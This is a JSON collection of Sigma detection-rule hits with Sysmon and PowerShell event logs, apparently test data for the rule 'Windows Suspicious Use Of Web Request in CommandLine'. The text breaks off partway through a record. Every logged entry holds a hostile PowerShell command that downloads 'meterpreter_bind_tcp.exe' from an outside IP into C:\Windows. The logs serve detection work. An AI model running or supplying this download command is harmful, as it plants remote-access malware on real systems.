[
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:06.896Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Process Create (rule: ProcessCreate)",
                    "category": [
                        "process"
                    ],
                    "code": 1,
                    "created": "2022-09-27T13:45:07.926Z",
                    "kind": "event",
                    "module": "sysmon",
                    "provider": "Microsoft-Windows-Sysmon",
                    "type": [
                        "start",
                        "process_start"
                    ]
                },
                "hash": {
                    "imphash": "272245e2988e1e430500b852c4fb5e18",
                    "md5": "8a2122e8162dbef04694b9c3e0b6cdee",
                    "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-09-27 13:45:06.896\nProcessGuid: {0e37ca90-fe62-6332-c603-000000000500}\nProcessId: 3824\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {0e37ca90-fe62-6332-bc7a-4a0000000000}\nLogonId: 0x4A7ABC\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {0e37ca90-fe62-6332-c503-000000000500}\nParentProcessId: 3480\nParentImage: C:\\Windows\\System32\\conhost.exe\nParentCommandLine: C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f4 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh",
                "process": {
                    "args": [
                        "c:\\windows\\system32\\cmd.exe",
                        "/c",
                        "cmd",
                        "/C",
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
                        "\"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                        "&&",
                        "echo",
                        "File",
                        "downloaded",
                        "successfully."
                    ],
                    "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.",
                    "entity_id": "{0e37ca90-fe62-6332-c603-000000000500}",
                    "executable": "C:\\Windows\\System32\\cmd.exe",
                    "hash": {
                        "md5": "8a2122e8162dbef04694b9c3e0b6cdee",
                        "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"
                    },
                    "name": "cmd.exe",
                    "parent": {
                        "args": [
                            "C:\\Windows\\system32\\conhost.exe",
                            "--headless",
                            "--width",
                            "80",
                            "--height",
                            "24",
                            "--signal",
                            "0x1f4",
                            "--",
                            "c:\\windows\\system32\\cmd.exe",
                            "/c",
                            "cmd",
                            "/C",
                            "powershell",
                            "-Command",
                            "$c",
                            "=",
                            "new-object",
                            "System.Net.WebClient;",
                            "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
                            "\"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                            "&&",
                            "echo",
                            "File",
                            "downloaded",
                            "successfully."
                        ],
                        "command_line": "C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f4 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.",
                        "entity_id": "{0e37ca90-fe62-6332-c503-000000000500}",
                        "executable": "C:\\Windows\\System32\\conhost.exe",
                        "name": "conhost.exe",
                        "pid": 3480
                    },
                    "pe": {
                        "imphash": "272245e2988e1e430500b852c4fb5e18"
                    },
                    "pid": 3824,
                    "working_directory": "C:\\Users\\ssh\\"
                },
                "related": {
                    "hash": [
                        "8a2122e8162dbef04694b9c3e0b6cdee",
                        "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450",
                        "272245e2988e1e430500b852c4fb5e18"
                    ],
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer_name": "CLIENT1.breach.local",
                    "event_data": {
                        "Company": "Microsoft Corporation",
                        "Description": "Windows Command Processor",
                        "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
                        "IntegrityLevel": "High",
                        "LogonGuid": "{0e37ca90-fe62-6332-bc7a-4a0000000000}",
                        "LogonId": "0x4a7abc",
                        "OriginalFileName": "Cmd.Exe",
                        "ParentUser": "CLIENT1\\ssh",
                        "Product": "Microsoft® Windows® Operating System",
                        "RuleName": "-",
                        "TerminalSessionId": "0"
                    },
                    "event_id": 1,
                    "opcode": "Info",
                    "process": {
                        "pid": 2076,
                        "thread": {
                            "id": 2556
                        }
                    },
                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "record_id": 4031,
                    "task": "Process Create (rule: ProcessCreate)",
                    "user": {
                        "domain": "NT AUTHORITY",
                        "identifier": "S-1-5-18",
                        "name": "SYSTEM",
                        "type": "User"
                    },
                    "version": 5
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:06.896+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:06.908Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Process Create (rule: ProcessCreate)",
                    "category": [
                        "process"
                    ],
                    "code": 1,
                    "created": "2022-09-27T13:45:07.926Z",
                    "kind": "event",
                    "module": "sysmon",
                    "provider": "Microsoft-Windows-Sysmon",
                    "type": [
                        "start",
                        "process_start"
                    ]
                },
                "hash": {
                    "imphash": "272245e2988e1e430500b852c4fb5e18",
                    "md5": "8a2122e8162dbef04694b9c3e0b6cdee",
                    "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-09-27 13:45:06.908\nProcessGuid: {0e37ca90-fe62-6332-c703-000000000500}\nProcessId: 6972\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {0e37ca90-fe62-6332-bc7a-4a0000000000}\nLogonId: 0x4A7ABC\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {0e37ca90-fe62-6332-c603-000000000500}\nParentProcessId: 3824\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh",
                "process": {
                    "args": [
                        "cmd",
                        "/C",
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
                        "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"
                    ],
                    "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ",
                    "entity_id": "{0e37ca90-fe62-6332-c703-000000000500}",
                    "executable": "C:\\Windows\\System32\\cmd.exe",
                    "hash": {
                        "md5": "8a2122e8162dbef04694b9c3e0b6cdee",
                        "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"
                    },
                    "name": "cmd.exe",
                    "parent": {
                        "args": [
                            "c:\\windows\\system32\\cmd.exe",
                            "/c",
                            "cmd",
                            "/C",
                            "powershell",
                            "-Command",
                            "$c",
                            "=",
                            "new-object",
                            "System.Net.WebClient;",
                            "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
                            "\"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                            "&&",
                            "echo",
                            "File",
                            "downloaded",
                            "successfully."
                        ],
                        "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.",
                        "entity_id": "{0e37ca90-fe62-6332-c603-000000000500}",
                        "executable": "C:\\Windows\\System32\\cmd.exe",
                        "name": "cmd.exe",
                        "pid": 3824
                    },
                    "pe": {
                        "imphash": "272245e2988e1e430500b852c4fb5e18"
                    },
                    "pid": 6972,
                    "working_directory": "C:\\Users\\ssh\\"
                },
                "related": {
                    "hash": [
                        "8a2122e8162dbef04694b9c3e0b6cdee",
                        "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450",
                        "272245e2988e1e430500b852c4fb5e18"
                    ],
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer_name": "CLIENT1.breach.local",
                    "event_data": {
                        "Company": "Microsoft Corporation",
                        "Description": "Windows Command Processor",
                        "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
                        "IntegrityLevel": "High",
                        "LogonGuid": "{0e37ca90-fe62-6332-bc7a-4a0000000000}",
                        "LogonId": "0x4a7abc",
                        "OriginalFileName": "Cmd.Exe",
                        "ParentUser": "CLIENT1\\ssh",
                        "Product": "Microsoft® Windows® Operating System",
                        "RuleName": "-",
                        "TerminalSessionId": "0"
                    },
                    "event_id": 1,
                    "opcode": "Info",
                    "process": {
                        "pid": 2076,
                        "thread": {
                            "id": 2556
                        }
                    },
                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "record_id": 4032,
                    "task": "Process Create (rule: ProcessCreate)",
                    "user": {
                        "domain": "NT AUTHORITY",
                        "identifier": "S-1-5-18",
                        "name": "SYSTEM",
                        "type": "User"
                    },
                    "version": 5
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:06.908+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:06.918Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Process Create (rule: ProcessCreate)",
                    "category": [
                        "process"
                    ],
                    "code": 1,
                    "created": "2022-09-27T13:45:07.926Z",
                    "kind": "event",
                    "module": "sysmon",
                    "provider": "Microsoft-Windows-Sysmon",
                    "type": [
                        "start",
                        "process_start"
                    ]
                },
                "hash": {
                    "imphash": "7c955a0abc747f57ccc4324480737ef7",
                    "md5": "04029e121a0cfa5991749937dd22a1d9",
                    "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-09-27 13:45:06.918\nProcessGuid: {0e37ca90-fe62-6332-c803-000000000500}\nProcessId: 3000\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {0e37ca90-fe62-6332-bc7a-4a0000000000}\nLogonId: 0x4A7ABC\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {0e37ca90-fe62-6332-c703-000000000500}\nParentProcessId: 6972\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nParentUser: CLIENT1\\ssh",
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
                        "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"
                    ],
                    "command_line": "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ",
                    "entity_id": "{0e37ca90-fe62-6332-c803-000000000500}",
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "hash": {
                        "md5": "04029e121a0cfa5991749937dd22a1d9",
                        "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                    },
                    "name": "powershell.exe",
                    "parent": {
                        "args": [
                            "cmd",
                            "/C",
                            "powershell",
                            "-Command",
                            "$c",
                            "=",
                            "new-object",
                            "System.Net.WebClient;",
                            "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
                            "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"
                        ],
                        "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ",
                        "entity_id": "{0e37ca90-fe62-6332-c703-000000000500}",
                        "executable": "C:\\Windows\\System32\\cmd.exe",
                        "name": "cmd.exe",
                        "pid": 6972
                    },
                    "pe": {
                        "imphash": "7c955a0abc747f57ccc4324480737ef7"
                    },
                    "pid": 3000,
                    "working_directory": "C:\\Users\\ssh\\"
                },
                "related": {
                    "hash": [
                        "04029e121a0cfa5991749937dd22a1d9",
                        "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
                        "7c955a0abc747f57ccc4324480737ef7"
                    ],
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer_name": "CLIENT1.breach.local",
                    "event_data": {
                        "Company": "Microsoft Corporation",
                        "Description": "Windows PowerShell",
                        "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                        "IntegrityLevel": "High",
                        "LogonGuid": "{0e37ca90-fe62-6332-bc7a-4a0000000000}",
                        "LogonId": "0x4a7abc",
                        "OriginalFileName": "PowerShell.EXE",
                        "ParentUser": "CLIENT1\\ssh",
                        "Product": "Microsoft® Windows® Operating System",
                        "RuleName": "-",
                        "TerminalSessionId": "0"
                    },
                    "event_id": 1,
                    "opcode": "Info",
                    "process": {
                        "pid": 2076,
                        "thread": {
                            "id": 2556
                        }
                    },
                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "record_id": 4033,
                    "task": "Process Create (rule: ProcessCreate)",
                    "user": {
                        "domain": "NT AUTHORITY",
                        "identifier": "S-1-5-18",
                        "name": "SYSTEM",
                        "type": "User"
                    },
                    "version": 5
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:06.918+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.233Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Provider Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 600,
                    "created": "2022-09-27T13:45:07.902Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 5,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Provider \"Environment\" is Started. \n\nDetails: \n\tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "provider": {
                        "name": "Environment",
                        "new_state": "Started"
                    }
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 600,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6591,
                    "task": "Provider Lifecycle"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.233+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.233Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Provider Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 600,
                    "created": "2022-09-27T13:45:07.902Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 1,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Provider \"Registry\" is Started. \n\nDetails: \n\tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "provider": {
                        "name": "Registry",
                        "new_state": "Started"
                    }
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 600,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6589,
                    "task": "Provider Lifecycle"
                }
            }
        },
        "name": "Windows Suspicious Use Of Web Request in CommandLine",
        "timestamp": "2022-09-27T13:45:07.233+00:00",
        "authors": [
            "James Pemberton / @4A616D6573"
        ],
        "level": "medium",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer."
        ],
        "id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/",
            "https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-09-27T13:45:07.233Z",
                "agent": {
                    "ephemeral_id": "f3e67ec5-847a-448b-8ec4-bac040a44990",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Provider Lifecycle",
                    "category": [
                        "process"
                    ],
                    "code": 600,
                    "created": "2022-09-27T13:45:07.902Z",
                    "kind": "event",
                    "module": "powershell",
                    "provider": "PowerShell",
                    "sequence": 3,
                    "type": [
                        "info"
                    ]
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Provider \"Alias\" is Started. \n\nDetails: \n\tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=d69f1bbf-903d-443c-89cb-973593849f0a\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
                "powershell": {
                    "process": {
                        "executable_version": "5.1.19041.1237"
                    },
                    "provider": {
                        "name": "Alias",
                        "new_state": "Started"
                    }
                },
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
                    ],
                    "args_count": 8,
                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
                    "entity_id": "d69f1bbf-903d-443c-89cb-973593849f0a",
                    "title": "ConsoleHost"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Windows PowerShell",
                    "computer_name": "CLIENT1.breach.local",
                    "event_id": 600,
                    "keywords": [
                        "Classic"
                    ],
                    "opcode": "Info",
                    "provider_name": "PowerShell",
                    "record_id": 6590,
